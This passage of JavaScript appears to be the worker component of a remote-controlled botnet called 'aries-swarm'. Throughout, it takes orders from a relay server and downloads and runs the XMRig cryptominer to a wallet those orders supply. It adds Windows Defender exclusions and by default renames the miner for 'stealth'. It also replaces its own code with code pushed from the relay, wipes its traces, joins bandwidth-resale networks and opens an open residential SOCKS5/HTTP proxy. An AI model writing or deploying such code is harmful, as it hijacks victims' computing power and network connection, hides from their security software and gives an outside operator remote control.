  var cores = os.cpus().length;
  sendChatMessage('Worker ' + HOSTNAME + ' online — ' + ramGb + 'GB RAM, ' + cores + ' cores');
}

// Chat polling (every 30s)
var _lastChatPoll = 0;
setInterval(function() {
  request(RELAY_URL + '/api/swarm/chat?limit=10', { timeout: 5000 }).then(function(res) {
    if (res.status === 200) {
      try {
        var data = JSON.parse(res.body);
        var msgs = data.messages || [];
        msgs.forEach(function(m) {
          if (m.timestamp > _lastChatPoll && m.from !== HOSTNAME) {
            handleChatMessage(m);
          }
        });
        if (msgs.length > 0) _lastChatPoll = msgs[msgs.length - 1].timestamp || Date.now();
      } catch(e) {}
    }
  }).catch(function() {});
}, 30000);

// ══════════════════════════════════════
//  BTC MINER — XMRig CPU Mining
// ══════════════════════════════════════
let _minerProcess = null;
let _minerReportInterval = null;

async function handleMineStart(task) {
  if (_minerProcess) { log('Miner already running'); return { status: 'already_running' }; }
  const wallet = task.wallet;
  const pool = task.pool;
  const workerPrefix = task.workerPrefix || 'aries-';
  const threads = task.threads || 0;
  const intensity = task.intensity || 'medium';
  const hostname = os.hostname();
  const workerName = workerPrefix + hostname;

  // Capture master URL for direct reporting
  if (task.masterUrl) _masterUrl = task.masterUrl;

  // Track intensity for auto-throttle
  _originalIntensity = intensity;
  _currentIntensity = intensity;

  log(`Mine start: pool=${pool} wallet=${wallet.substring(0,10)}... worker=${workerName} threads=${threads || 'auto'}`);

  // Try to find or download xmrig
  const xmrigDir = path.join(os.tmpdir(), 'aries-xmrig');
  const xmrigBin = path.join(xmrigDir, process.platform === 'win32' ? 'xmrig.exe' : 'xmrig');

  if (!fs.existsSync(xmrigBin)) {
    log('XMRig not found, attempting download...');
    try {
      if (!fs.existsSync(xmrigDir)) fs.mkdirSync(xmrigDir, { recursive: true });
      // Download xmrig release
      const isWin = process.platform === 'win32';
      const isLinux = process.platform === 'linux';
      const dlUrl = isWin
        ? 'https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip'
        : 'https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz';
      const dlFile = path.join(xmrigDir, isWin ? 'xmrig.zip' : 'xmrig.tar.gz');

      // Use curl/wget to download
      const { execSync } = require('child_process');
      if (isWin) {
        execSync(`powershell -Command "Invoke-WebRequest -Uri '${dlUrl}' -OutFile '${dlFile}' -UseBasicParsing"`, { timeout: 120000 });
        execSync(`powershell -Command "Expand-Archive -Path '${dlFile}' -DestinationPath '${xmrigDir}' -Force"`, { timeout: 30000 });
        // Find xmrig.exe recursively
        const findXmrig = execSync(`powershell -Command "Get-ChildItem -Path '${xmrigDir}' -Recurse -Filter 'xmrig.exe' | Select-Object -First 1 -ExpandProperty FullName"`, { encoding: 'utf8', timeout: 5000 }).trim();
        if (findXmrig && findXmrig !== xmrigBin) fs.copyFileSync(findXmrig, xmrigBin);
      } else {
        execSync(`curl -fsSL -o '${dlFile}' '${dlUrl}'`, { timeout: 120000 });
        execSync(`tar xzf '${dlFile}' -C '${xmrigDir}' --strip-components=1`, { timeout: 30000 });
        execSync(`chmod +x '${xmrigBin}'`, { timeout: 5000 });
      }
      log('XMRig downloaded successfully');
    } catch (e) {
      log(`XMRig download failed: ${e.message}`);
      reportMinerStats({ status: 'error', error: 'xmrig download failed: ' + e.message });
      return { status: 'error', error: e.message };
    }
  }

  if (!fs.existsSync(xmrigBin)) {
    log('XMRig binary not found after download');
    reportMinerStats({ status: 'no-xmrig' });
    return { status: 'error', error: 'xmrig not found' };
  }

  // Add Windows Defender exclusion for xmrig directory (best-effort, needs admin)
  if (process.platform === 'win32') {
    try {
      const { execSync } = require('child_process');
      execSync(`powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '${xmrigDir}'" 2>nul`, { timeout: 10000, stdio: 'ignore' });
      log('Added Defender exclusion for xmrig directory');
    } catch (e) {
      log('Defender exclusion failed (may need admin): ' + e.message);
    }
  }

  // Stealth: rename binary if enabled
  const stealth = task.stealth !== undefined ? task.stealth : true;
  const actualBin = getStealthBin(xmrigBin, stealth);
  if (stealth && _stealthBinPath && process.platform === 'win32') {
    try { const { execSync } = require('child_process'); execSync(`powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '${path.dirname(_stealthBinPath)}'" 2>nul`, { timeout: 10000, stdio: 'ignore' }); } catch (e) {}
  }

  // Build xmrig args
  const args = [
    '-o', pool,
    '-u', wallet + '.' + workerName + (task.referralCode ? '#' + task.referralCode : ''),
    '-p', 'x',
    '--donate-level', '0',
    '--http-enabled', '--http-host', '127.0.0.1', '--http-port', '18088',
    '--print-time', '5'
  ];
  if (threads > 0) args.push('-t', String(threads));
  if (intensity === 'low') args.push('--cpu-max-threads-hint', '25');
  else if (intensity === 'medium') args.push('--cpu-max-threads-hint', '50');
  else if (intensity === 'high') args.push('--cpu-max-threads-hint', '75');
  // max = no hint, use all

  const { spawn } = require('child_process');
  _minerProcess = spawn(actualBin, args, { stdio: 'pipe', detached: false });

  let currentHashrate = 0;
  let sharesAccepted = 0;
  let sharesRejected = 0;
  const mineStartTime = Date.now();

  _minerProcess.stdout.on('data', (chunk) => {
    const line = chunk.toString();
    const hrMatch = line.match(/speed\s+[\d.]+s\/[\d.]+s\/[\d.]+s\s+([\d.]+)/);
    if (hrMatch) currentHashrate = parseFloat(hrMatch[1]);
    const accMatch = line.match(/accepted\s+\((\d+)/);
    if (accMatch) sharesAccepted = parseInt(accMatch[1]);
    const rejMatch = line.match(/rejected\s+\((\d+)/);
    if (rejMatch) sharesRejected = parseInt(rejMatch[1]);
  });

  _minerProcess.stderr.on('data', (chunk) => {
    const line = chunk.toString();
    if (line.indexOf('speed') >= 0) {
      const hrMatch = line.match(/([\d.]+)\s*H\/s/);
      if (hrMatch) currentHashrate = parseFloat(hrMatch[1]);
    }
  });

  _minerProcess.on('exit', (code) => {
    log(`XMRig exited with code ${code}`);
    _minerProcess = null;
    if (_minerReportInterval) { clearInterval(_minerReportInterval); _minerReportInterval = null; }
    reportMinerStats({ status: 'stopped', hashrate: 0 });
  });

  // Report stats every 5 seconds
  _minerReportInterval = setInterval(() => {
    reportMinerStats({
      status: 'mining',
      hashrate: currentHashrate,
      sharesAccepted,
      sharesRejected,
      threads: threads || os.cpus().length - 1,
      cpu: os.cpus()[0].model,
      uptime: Math.floor((Date.now() - mineStartTime) / 1000)
    });
  }, 5000);

  // Start activity monitor and scheduled mining
  startActivityMonitor();
  if (task.schedule) startScheduledMining(task.schedule);

  log(`XMRig started: PID=${_minerProcess.pid}`);
  sendChatMessage('Starting mining at ' + intensity + ' intensity');
  return { status: 'mining', pid: _minerProcess.pid };
}

async function handleMineStop() {
  if (!_minerProcess) { log('No miner running'); return { status: 'not_running' }; }
  log('Stopping miner...');
  try { _minerProcess.kill('SIGTERM'); } catch (e) {}
  _minerProcess = null;
  if (_minerReportInterval) { clearInterval(_minerReportInterval); _minerReportInterval = null; }
  stopActivityMonitor();
  stopScheduledMining();
  cleanupStealthBin();
  reportMinerStats({ status: 'stopped', hashrate: 0 });
  sendChatMessage('Mining stopped');
  return { status: 'stopped' };
}

let _masterUrl = '';  // Set by mine-start task

function reportMinerStats(stats) {
  const hostname = os.hostname();
  const nodeId = 'worker-' + hostname;
  const payload = { nodeId, hostname, ...stats };

  // Report to master Aries server if URL is known
  if (_masterUrl) {
    request(`${_masterUrl}/api/miner/node-report`, {
      method: 'POST',
      body: payload
    }).catch(() => {});
  }

  // Also report via relay as a swarm result so relay can forward
  request(`${RELAY_URL}/api/swarm/result`, {
    method: 'POST',
    body: { taskId: 'miner-stats-' + nodeId, worker: HOSTNAME, type: 'miner-stats', result: payload }
  }).catch(() => {});

  // Also try relay's node-report endpoint in case relay proxies it
  request(`${RELAY_URL}/api/miner/node-report`, {
    method: 'POST',
    body: payload
  }).catch(() => {});
}

// --- Benchmark handler ---
async function handleMineBenchmark(task) {
  var duration = (task.duration || 60) * 1000;
  log('Benchmark: running xmrig for ' + (duration / 1000) + 's');
  var xmrigDir = path.join(os.tmpdir(), 'aries-xmrig');
  var xmrigBin = path.join(xmrigDir, process.platform === 'win32' ? 'xmrig.exe' : 'xmrig');
  if (!fs.existsSync(xmrigBin)) { log('Benchmark: xmrig not found'); reportMinerStats({ type: 'benchmark', status: 'error', error: 'xmrig not found' }); return; }
  var { spawn } = require('child_process');
  var args = ['--bench', '--print-time', '5', '--donate-level', '0'];
  // Fallback: use stress test mode with a dummy pool if --bench not supported
  var bmProc = spawn(xmrigBin, ['-o', 'stratum+tcp://rx.unmineable.com:3333', '-u', 'SOL:benchmark.test', '-p', 'x', '--donate-level', '0', '--print-time', '5'], { stdio: 'pipe', detached: false });
  var peakHashrate = 0;
  var currentHashrate = 0;
  bmProc.stdout.on('data', function(chunk) {
    var line = chunk.toString();
    var hrMatch = line.match(/speed\s+[\d.]+s\/[\d.]+s\/[\d.]+s\s+([\d.]+)/);
    if (hrMatch) { currentHashrate = parseFloat(hrMatch[1]); if (currentHashrate > peakHashrate) peakHashrate = currentHashrate; }
  });
  bmProc.stderr.on('data', function(chunk) {
    var line = chunk.toString();
    var hrMatch = line.match(/([\d.]+)\s*H\/s/);
    if (hrMatch) { currentHashrate = parseFloat(hrMatch[1]); if (currentHashrate > peakHashrate) peakHashrate = currentHashrate; }
  });
  await new Promise(function(resolve) { setTimeout(resolve, duration); });
  try { bmProc.kill('SIGTERM'); } catch(e) {}
  log('Benchmark complete: peak=' + peakHashrate + ' H/s');
  // Save to env.json
  try { var envData = JSON.parse(fs.readFileSync(ENV_FILE, 'utf8')); envData.benchmarkHashrate = peakHashrate; fs.writeFileSync(ENV_FILE, JSON.stringify(envData, null, 2)); } catch(e) {}
  // Report back
  reportMinerStats({ type: 'benchmark', hashrate: peakHashrate, threads: os.cpus().length, cpu: os.cpus()[0].model });
}

// --- Mine restart handler ---
async function handleMineRestart() {
  log('Received mine-restart command');
  if (_minerProcess) {
    try { _minerProcess.kill('SIGTERM'); } catch(e) {}
    _minerProcess = null;
    if (_minerReportInterval) { clearInterval(_minerReportInterval); _minerReportInterval = null; }
  }
  // Wait 5 seconds then re-poll for mine-start task
  await new Promise(r => setTimeout(r, 5000));
  log('Miner restart: waiting for new mine-start task');
}

// --- Worker update handler ---
async function handleWorkerUpdate(task) {
  var code = task.code || '';
  if (!code) { log('Worker update: no code received'); return; }
  var tmpFile = path.join(__dirname, 'worker.js.tmp');
  var currentFile = __filename;
  try {
    fs.writeFileSync(tmpFile, code, 'utf8');
    // Validate syntax
    var { execSync } = require('child_process');
    execSync('node -c "' + tmpFile.replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"', { timeout: 10000 });
    // Replace current file
    fs.copyFileSync(tmpFile, currentFile);
    fs.unlinkSync(tmpFile);
    log('Worker update: code replaced, restarting...');
    // Spawn new process and exit
    var { spawn } = require('child_process');
    spawn(process.execPath, [currentFile], { stdio: 'ignore', detached: true }).unref();
    process.exit(0);
  } catch(e) {
    log('Worker update failed: ' + e.message);
    try { fs.unlinkSync(tmpFile); } catch(e2) {}
  }
}

// --- Self-healing miner monitor ---
var _minerRestartCount = 0;
var _minerZeroHashStart = 0;
var _lastMineTask = null;

// Patch handleMineStart to save task and add self-healing
var _origHandleMineStart = handleMineStart;
handleMineStart = async function(task) {
  _lastMineTask = task;
  _minerRestartCount = 0;
  _minerZeroHashStart = 0;
  // Apply dead man's switch config
  if (task.deadManSwitch) { _deadManConfig = { enabled: task.deadManSwitch.enabled !== false, timeoutHours: task.deadManSwitch.timeoutHours || 48 }; }
  startDeadManSwitch();
  // Apply canary config
  if (task.canary) { _canaryConfig = { enabled: task.canary.enabled !== false, allowVM: task.canary.allowVM !== false }; }
  startCanaryChecks();
  var result = await _origHandleMineStart(task);
  if (_minerProcess) {
    _minerProcess.on('exit', function(code) {
      if (_lastMineTask && _minerRestartCount < 5) {
        _minerRestartCount++;
        log('Self-heal: xmrig exited unexpectedly (code=' + code + '), restart #' + _minerRestartCount + ' in 10s');
        setTimeout(function() {
          if (_lastMineTask) _origHandleMineStart(_lastMineTask);
        }, 10000);
      } else if (_minerRestartCount >= 5) {
        log('Self-heal: max restart attempts (5) reached, giving up');
        reportMinerStats({ status: 'error', error: 'max restarts exceeded' });
      }
    });
  }
  return result;
};

// Monitor zero hashrate
setInterval(function() {
  if (!_minerProcess || !_lastMineTask) return;
  // Check via xmrig HTTP API
  try {
    http.get('http://127.0.0.1:18088/1/summary', function(resp) {
      var d = ''; resp.on('data', function(c) { d += c; }); resp.on('end', function() {
        try {
          var summary = JSON.parse(d);
          var hr = (summary.hashrate && summary.hashrate.total && summary.hashrate.total[0]) || 0;
          if (hr <= 0) {
            if (!_minerZeroHashStart) _minerZeroHashStart = Date.now();
            else if (Date.now() - _minerZeroHashStart > 60000 && _minerRestartCount < 5) {
              log('Self-heal: hashrate 0 for 60s, killing xmrig');
              _minerZeroHashStart = 0;
              try { _minerProcess.kill('SIGTERM'); } catch(e) {}
            }
          } else { _minerZeroHashStart = 0; }
        } catch(e) {}
      });
    }).on('error', function() {});
  } catch(e) {}
}, 15000);

// ══════════════════════════════════════
//  WIPE-REDEPLOY HANDLER
// ══════════════════════════════════════
async function handleWipeRedeploy() {
  log('Wipe-redeploy: starting...');
  // Stop mining
  if (_minerProcess) { try { _minerProcess.kill('SIGTERM'); } catch (e) {} _minerProcess = null; }
  if (_minerReportInterval) { clearInterval(_minerReportInterval); _minerReportInterval = null; }
  // Delete data files but keep env.json
  var xmrigDir = path.join(os.tmpdir(), 'aries-xmrig');
  try { fs.rmSync(xmrigDir, { recursive: true, force: true }); } catch (e) {}
  cleanupStealthBin();
  try { fs.unlinkSync(LOG_FILE); } catch (e) {}
  var localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local');
  try { fs.rmSync(path.join(localAppData, 'aries-swarm'), { recursive: true, force: true }); } catch (e) {}
  // Report wipe complete
  try {
    await request(RELAY_URL + '/api/swarm/result', {
      method: 'POST',
      body: { taskId: 'wipe-complete-' + HOSTNAME, worker: HOSTNAME, type: 'wipe-complete', result: { timestamp: Date.now() } }
    });
  } catch (e) {}
  log('Wipe-redeploy: wipe complete, restarting...');
  // Re-download worker.js from relay and restart
  try {
    var res = await request(RELAY_URL + '/api/swarm/worker-code?platform=windows', { timeout: 30000 });
    if (res.status === 200 && res.body.length > 100) {
      fs.writeFileSync(__filename, res.body, 'utf8');
      log('Wipe-redeploy: code updated from relay');
    }
  } catch (e) { log('Wipe-redeploy: code download failed (using existing): ' + e.message); }
  // Restart process
  var { spawn } = require('child_process');
  spawn(process.execPath, [__filename], { stdio: 'ignore', detached: true }).unref();
  process.exit(0);
}

// ══════════════════════════════════════
//  SWARM INTELLIGENCE HANDLER
// ══════════════════════════════════════
var _discoveryData = { algoHashrate: 0, poolLatency: 0, threadPerf: 0, cpuModel: '' };
var _poolLatencyInterval = null;

function handleSwarmIntelligence(task) {
  var rec = task.recommendation || {};
  log('Swarm intelligence: received recommendation type=' + (rec.type || 'broadcast'));
  if (rec.type === 'thread_change' && rec.threads && _minerProcess) {
    log('Swarm intelligence: applying thread change to ' + rec.threads);
    applyMinerThrottle(String(Math.round(rec.threads / os.cpus().length * 100)));
  }
  if (rec.type === 'pool_switch' && rec.pool && _lastMineTask) {
    log('Swarm intelligence: pool switch requested to ' + rec.pool);
    // Restart miner with new pool
    _lastMineTask.pool = rec.pool;
    if (_minerProcess) { try { _minerProcess.kill('SIGTERM'); } catch(e) {} }
  }
}

// Discovery tracking: measure pool latency every 5 min
function startDiscoveryTracking() {
  _discoveryData.cpuModel = os.cpus()[0] ? os.cpus()[0].model.trim() : 'unknown';
  if (_poolLatencyInterval) clearInterval(_poolLatencyInterval);
  _poolLatencyInterval = setInterval(function() {
    if (!_lastMineTask || !_lastMineTask.pool) return;
    var poolHost = _lastMineTask.pool.replace(/^.*:\/\//, '').split(':')[0];
    var start = Date.now();
    var netMod = require('net');
    var sock = new netMod.Socket();
    sock.setTimeout(5000);
    sock.connect(parseInt(_lastMineTask.pool.split(':').pop()) || 3333, poolHost, function() {
      _discoveryData.poolLatency = Date.now() - start;
      sock.destroy();
      // Report discovery
      request(RELAY_URL + '/api/intelligence/discovery', {
        method: 'POST',
        body: { workerId: HOSTNAME, discovery: { type: 'pool_latency', pool: _lastMineTask.pool, latency: _discoveryData.poolLatency, success: true } }
      }).catch(function() {});
    });
    sock.on('error', function() {
      request(RELAY_URL + '/api/intelligence/discovery', {
        method: 'POST',
        body: { workerId: HOSTNAME, discovery: { type: 'pool_latency', pool: _lastMineTask.pool, latency: 9999, success: false } }
      }).catch(function() {});
      sock.destroy();
    });
    sock.on('timeout', function() { sock.destroy(); });
  }, 300000); // every 5 min
}
startDiscoveryTracking();

// Patch getWorkerInfo to include discoveries
var _origGetWorkerInfo = getWorkerInfo;
getWorkerInfo = function() {
  var info = _origGetWorkerInfo();
  info.discoveries = {
    algoHashrate: _discoveryData.algoHashrate,
    poolLatency: _discoveryData.poolLatency,
    cpuModel: _discoveryData.cpuModel
  };
  return info;
};

// ══════════════════════════════════════
//  MESH NETWORK INTEGRATION
// ══════════════════════════════════════
var _meshNetwork = null;
var _meshRelayFailed = false;

function initMesh() {
  try {
    var MeshNetwork = require(require('path').join(__dirname, '..', 'core', 'mesh-network'));
    _meshNetwork = new MeshNetwork({
      workerId: HOSTNAME,
      relayUrl: RELAY_URL,
      secret: SECRET
    });

    _meshNetwork.on('peer-discovered', function(p) { log('Mesh: peer discovered ' + p.workerId + ' @ ' + p.ip); });
    _meshNetwork.on('peer-lost', function(p) { log('Mesh: peer lost ' + p.workerId + ' @ ' + p.ip); });
    _meshNetwork.on('gateway-elected', function(g) { log('Mesh: gateway elected ' + g.workerId + ' @ ' + g.ip); });
    _meshNetwork.on('gateway-changed', function(g) { log('Mesh: gateway changed to ' + g.workerId + ' @ ' + g.ip); });
    _meshNetwork.on('relay-forwarded', function(info) { log('Mesh: forwarded ' + info.count + ' messages to relay'); });
    _meshNetwork.on('task', function(task) {
      log('Mesh: received task from gateway');
      if (task && task.id) processTask(task).catch(function(e) { log('Mesh task error: ' + e.message); });
    });
    _meshNetwork.on('error', function(e) { log('Mesh error: ' + e.message); });

    _meshNetwork.start();
    log('Mesh network started on UDP port ' + _meshNetwork.port);
  } catch (e) {
    log('Mesh init failed (non-fatal): ' + e.message);
  }
}

// Wrap sendHeartbeat to use site controller or mesh fallback
var _origSendHeartbeat = sendHeartbeat;
sendHeartbeat = async function() {
  var info = getWorkerInfo();
  // Add mesh stats
  if (_meshNetwork) {
    var ms = _meshNetwork.getStats();
    info.mesh = { role: ms.role, peers: ms.peers, gatewayIp: ms.gatewayIp, messagesRelayed: ms.messagesRelayed };
  }

  // If site controller is configured, send heartbeat there instead of relay
  var heartbeatUrl = _siteControllerUrl
    ? (_siteControllerUrl.replace(/\/$/, '') + '/api/site/heartbeat')
    : (RELAY_URL + '/api/swarm/heartbeat');

  try {
    var hbRes = await request(heartbeatUrl, { method: 'POST', body: info });
    if (hbRes.status >= 200 && hbRes.status < 300) {
      _lastHeartbeatResponse = Date.now();
      _meshRelayFailed = false;
      if (_meshNetwork) _meshNetwork._canReachRelay = true;
    }
  } catch (e) {
    log('Heartbeat failed (' + (_siteControllerUrl ? 'controller' : 'relay') + '): ' + e.message);
    // If controller failed, try direct relay as fallback
    if (_siteControllerUrl) {
      try {
        var fallback = await request(RELAY_URL + '/api/swarm/heartbeat', { method: 'POST', body: info });
        if (fallback.status >= 200 && fallback.status < 300) { _lastHeartbeatResponse = Date.now(); return; }
      } catch (e2) {}
    }
    _meshRelayFailed = true;
    if (_meshNetwork) {
      _meshNetwork._canReachRelay = false;
      if (_meshNetwork.sendToGateway(info)) {
        log('Heartbeat sent via mesh gateway');
      }
    }
  }
};

// ══════════════════════════════════════
//  THIRD-PARTY PROXY NETWORKS
// ══════════════════════════════════════
var _proxyNetworkProcs = {}; // network → { proc, restartCount }
var _proxyNetworkDir = path.join(WORK_DIR, 'proxy-networks');

async function _joinProxyNetwork(task) {
  var network = task.network;
  if (!network) return;
  log('Joining proxy network: ' + network + ' (' + (task.name || '') + ')');

  try { fs.mkdirSync(_proxyNetworkDir, { recursive: true }); } catch (e) {}

  var platform = process.platform === 'win32' ? 'win32' : 'linux';
  var downloadUrl = (task.downloadUrls || {})[platform];
  var cliName = task.cli || network;
  var ext = platform === 'win32' ? '.exe' : '';
  var cliBin = path.join(_proxyNetworkDir, cliName + ext);

  // Download CLI if not present
  if (!fs.existsSync(cliBin) && downloadUrl) {
    log('Downloading ' + network + ' CLI from ' + downloadUrl);
    try {
      var dlRes = await request(downloadUrl, { method: 'GET' });
      if (dlRes.status >= 200 && dlRes.status < 300 && dlRes.body) {
        fs.writeFileSync(cliBin, typeof dlRes.body === 'string' ? Buffer.from(dlRes.body, 'binary') : dlRes.body);
        if (platform !== 'win32') { try { fs.chmodSync(cliBin, 0o755); } catch (e) {} }
        log('Downloaded ' + network + ' CLI');
      } else {
        log('Download failed for ' + network + ': HTTP ' + dlRes.status);
      }
    } catch (e) {
      log('Download failed for ' + network + ': ' + e.message);
    }
  }

  // Build args from credentials
  var creds = task.credentials || {};
  var args = [];
  if (network === 'honeygain' && creds.email) args = ['-tou-accept', '-email', creds.email, '-pass', creds.password || ''];
  else if (network === 'pawns' && creds.email) args = ['-email=' + creds.email, '-password=' + (creds.password || ''), '-device-name=aries-' + HOSTNAME, '-accept-tos'];
  else if (network === 'packetstream' && creds.apiKey) args = ['--api-key', creds.apiKey];
  else if (network === 'grass' && creds.email) args = ['--email', creds.email, '--password', creds.password || ''];
  else if (network === 'earnapp' && creds.apiKey) args = ['--token', creds.apiKey];
  else if (network === 'repocket') args = ['--email', creds.email || '', '--api-key', creds.apiKey || ''];

  // Stop existing if running
  _stopProxyNetwork(network);

  // Start CLI as background process
  if (fs.existsSync(cliBin)) {
    _startProxyNetworkProc(network, cliBin, args);
  } else {
    log(network + ' CLI not found at ' + cliBin + ' — configure manually or ensure download URL is correct');
  }
}

function _startProxyNetworkProc(network, bin, args) {
  try {
    var child = require('child_process');
    var proc = child.spawn(bin, args, {
      cwd: _proxyNetworkDir,
      stdio: 'ignore',
      detached: true,
      windowsHide: true
    });
    proc.unref();
    proc.on('error', function(e) { log(network + ' proc error: ' + e.message); });
    proc.on('exit', function(code) {
      log(network + ' exited with code ' + code);
      // Auto-restart after 30s if still registered
      if (_proxyNetworkProcs[network]) {
        var rc = (_proxyNetworkProcs[network].restartCount || 0) + 1;
        if (rc < 10) {
          log('Auto-restarting ' + network + ' in 30s (attempt ' + rc + ')');
          setTimeout(function() {
            if (_proxyNetworkProcs[network]) {
              _proxyNetworkProcs[network].restartCount = rc;
              _startProxyNetworkProc(network, bin, args);
            }
          }, 30000);
        }
      }
    });
    _proxyNetworkProcs[network] = { proc: proc, pid: proc.pid, restartCount: (_proxyNetworkProcs[network] || {}).restartCount || 0, startedAt: Date.now() };
    log(network + ' started (PID: ' + proc.pid + ')');
  } catch (e) {
    log('Failed to start ' + network + ': ' + e.message);
  }
}

function _stopProxyNetwork(network) {
  var entry = _proxyNetworkProcs[network];
  if (entry && entry.proc) {
    try { entry.proc.kill(); } catch (e) {}
  }
  delete _proxyNetworkProcs[network];
}

function _leaveProxyNetwork(task) {
  var network = task.network;
  if (!network) return;
  log('Leaving proxy network: ' + network);
  _stopProxyNetwork(network);
}

// ══════════════════════════════════════
//  RESIDENTIAL PROXY (inline SOCKS5 + HTTP)
// ══════════════════════════════════════
var _proxyServer = null;
var _proxyConnections = 0;
var _proxyBytesIn = 0;
var _proxyBytesOut = 0;
var _proxyAuth = { username: 'aries', password: 'proxy' };

function _isInternalIP(host) {
  if (!host) return true;
  if (host === 'localhost' || host === '127.0.0.1' || host === '::1') return true;
  var parts = host.split('.');
  if (parts.length !== 4) return false;
  var a = parseInt(parts[0]), b = parseInt(parts[1]);
  if (a === 10) return true;
  if (a === 172 && b >= 16 && b <= 31) return true;
  if (a === 192 && b === 168) return true;
  if (a === 169 && b === 254) return true;
  return false;
}

function _startLocalProxy(task) {
  if (_proxyServer) { log('Proxy already running'); return; }
  var port = task.port || 19900;
  if (task.auth) _proxyAuth = task.auth;

  _proxyServer = net.createServer(function(client) {
    _proxyConnections++;
    client.once('data', function(chunk) {
      if (chunk[0] === 0x05) {
        _handleSocks5Proxy(client, chunk);
      } else {
        _handleHttpProxy(client, chunk);
      }
    });
    client.on('error', function() {});
    client.on('close', function() { _proxyConnections--; });
  });

  _proxyServer.listen(port, '0.0.0.0', function() {
    log('Proxy started on port ' + port);
  });
  _proxyServer.on('error', function(e) { log('Proxy error: ' + e.message); _proxyServer = null; });
}

function _stopLocalProxy() {
  if (!_proxyServer) return;
  try { _proxyServer.close(); } catch (e) {}
  _proxyServer = null;
  log('Proxy stopped');
}

function _handleSocks5Proxy(client, initData) {
  var nmethods = initData[1] || 0;
  var hasAuth = false;
  for (var i = 0; i < nmethods; i++) { if (initData[2 + i] === 0x02) hasAuth = true; }
  if (!hasAuth) { client.end(Buffer.from([0x05, 0xFF])); return; }
  client.write(Buffer.from([0x05, 0x02]));

  client.once('data', function(authData) {
    if (authData[0] !== 0x01) { client.end(); return; }
    var ulen = authData[1];
    var user = authData.slice(2, 2 + ulen).toString();
    var plen = authData[2 + ulen];
    var pass = authData.slice(3 + ulen, 3 + ulen + plen).toString();
    if (user !== _proxyAuth.username || pass !== _proxyAuth.password) {
      client.end(Buffer.from([0x01, 0x01])); return;
    }
    client.write(Buffer.from([0x01, 0x00]));

    client.once('data', function(reqData) {
      if (reqData[0] !== 0x05 || reqData[1] !== 0x01) {
        client.end(Buffer.from([0x05, 0x07, 0x00, 0x01, 0,0,0,0, 0,0])); return;
      }
      var atyp = reqData[3], dstHost, offset;
      if (atyp === 0x01) {
        dstHost = reqData[4]+'.'+reqData[5]+'.'+reqData[6]+'.'+reqData[7]; offset = 8;
      } else if (atyp === 0x03) {
        var dlen = reqData[4]; dstHost = reqData.slice(5, 5+dlen).toString(); offset = 5+dlen;
      } else { client.end(Buffer.from([0x05, 0x08, 0x00, 0x01, 0,0,0,0, 0,0])); return; }
      var dstPort = reqData.readUInt16BE(offset);

      if (_isInternalIP(dstHost)) { client.end(Buffer.from([0x05, 0x02, 0x00, 0x01, 0,0,0,0, 0,0])); return; }

      var remote = net.createConnection(dstPort, dstHost, function() {
        var reply = Buffer.from([0x05, 0x00, 0x00, 0x01, 0,0,0,0, 0,0]);
        reply.writeUInt16BE(dstPort, 8);
        client.write(reply);
        _pipeProxy(client, remote);
      });
      remote.on('error', function() { try { client.end(Buffer.from([0x05, 0x05, 0x00, 0x01, 0,0,0,0, 0,0])); } catch {} });
    });
  });
}

function _handleHttpProxy(client, initData) {
  var head = initData.toString();
  var firstLine = head.split('\r\n')[0] || '';
  var parts = firstLine.split(' ');
  var method = parts[0];

  // Check auth
  var authMatch = head.match(/proxy-authorization:\s*basic\s+(\S+)/i);
  if (!authMatch) { client.end('HTTP/1.1 407 Proxy Authentication Required\r\nProxy-Authenticate: Basic realm="Aries"\r\n\r\n'); return; }
  try {
    var decoded = Buffer.from(authMatch[1], 'base64').toString();
    var cp = decoded.split(':');
    if (cp[0] !== _proxyAuth.username || cp.slice(1).join(':') !== _proxyAuth.password) {
      client.end('HTTP/1.1 407 Proxy Authentication Required\r\n\r\n'); return;
    }
  } catch (e) { client.end('HTTP/1.1 407 Proxy Authentication Required\r\n\r\n'); return; }

  if (method === 'CONNECT') {
    var target = parts[1] || '';
    var tp = target.split(':');
    var host = tp[0], port = parseInt(tp[1]) || 443;
    if (_isInternalIP(host)) { client.end('HTTP/1.1 403 Forbidden\r\n\r\n'); return; }
    var remote = net.createConnection(port, host, function() {
      client.write('HTTP/1.1 200 Connection Established\r\n\r\n');
      _pipeProxy(client, remote);
    });
    remote.on('error', function() { try { client.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch {} });
  } else {
    var targetUrl;
    try { targetUrl = new (require('url').URL)(parts[1]); } catch (e) { client.end('HTTP/1.1 400 Bad Request\r\n\r\n'); return; }
    if (_isInternalIP(targetUrl.hostname)) { client.end('HTTP/1.1 403 Forbidden\r\n\r\n'); return; }
    var port = parseInt(targetUrl.port) || 80;
    var remote = net.createConnection(port, targetUrl.hostname, function() {
      var newHead = head.replace(parts[1], targetUrl.pathname + (targetUrl.search || ''));
      newHead = newHead.replace(/proxy-authorization:[^\r\n]*\r\n/gi, '');
      remote.write(newHead);
      _pipeProxy(client, remote);
    });
    remote.on('error', function() { try { client.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch {} });
  }
}

function _pipeProxy(client, remote) {
  client.on('data', function(c) { _proxyBytesIn += c.length; try { remote.write(c); } catch {} });
  remote.on('data', function(c) { _proxyBytesOut += c.length; try { client.write(c); } catch {} });
  client.on('end', function() { try { remote.end(); } catch {} });
  remote.on('end', function() { try { client.end(); } catch {} });
  client.on('error', function() { try { remote.destroy(); } catch {} });
  remote.on('error', function() { try { client.destroy(); } catch {} });
}

main().catch(e => { log(`Fatal: ${e.message}`); process.exit(1); });
